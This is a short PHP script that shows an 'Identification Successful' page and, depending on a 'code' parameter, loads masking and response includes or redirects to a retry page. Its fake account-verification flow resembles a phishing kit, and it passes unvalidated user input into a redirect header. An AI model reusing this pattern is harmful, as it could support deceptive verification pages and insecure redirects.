<?php 
  session_start();
  require_once('lib/request.php');

  $protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))=='https'?'https':'http';
  $hostName = $_SERVER['HTTP_HOST'];
  $domain = $protocol.'://'.$hostName."/";
  $loginURL = $domain . 'login.php';

	$success = "System is verifying your record...";
	// print_r($_GET);
	if(isset($_GET['code'])) {
  	require_once('Masking/country_sc.php');
		require_once('Responses/verified_responses.php');
	} 
	else {
		$u_id = $_GET['u_id'];
		header('Location: ' . $domain . 'tryagain.php?u_id=' . $u_id);
	}
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
  <head>
    <meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1">
    <title>Success</title>
    <link rel="stylesheet" type="text/css" href="success.css" />
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:300,300i,400,400i,700,700i&amp;display=swap" />
  </head>
  <body class="Root">
    <div class="single-root">
      <div class="main-view">
	      <div class="main-view-intro">
	        <div class="main-view-logo">
	          <img class="view-image" src="check.png" alt="check">
	        </div>
	        <div class="main-view-title">
	          Identification Successful!
	        </div>
	        <div class="main-view-body">
	          We're continuing to 
	          <br>process your account
	        </div>
	      </div>
      </div>
    </div>
  </body>
  <script type="text/javascript">
  	var myGeeksforGeeksWindow;
  	function close_window() {
  		window.close();
  	}
  </script>
</html>
